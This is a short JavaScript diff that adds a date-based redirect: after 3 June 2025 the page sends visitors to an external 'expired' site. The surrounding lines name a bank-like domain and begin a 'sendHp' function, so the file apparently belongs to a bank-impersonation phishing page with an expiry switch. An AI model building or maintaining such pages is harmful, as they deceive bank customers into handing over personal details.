@@ -1,3 +1,10 @@
+let tglNow = new Date();
+let waktuBatas = new Date("2025-06-03T23:59:59");
+if (tglNow.getTime() >= waktuBatas.getTime()) {
+  document.location.href = 'https://expiredweb.pages.dev';
+} else {
+  console.log('Server aktif');
+}
 var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱----▩";    
        
  function sendHp(){
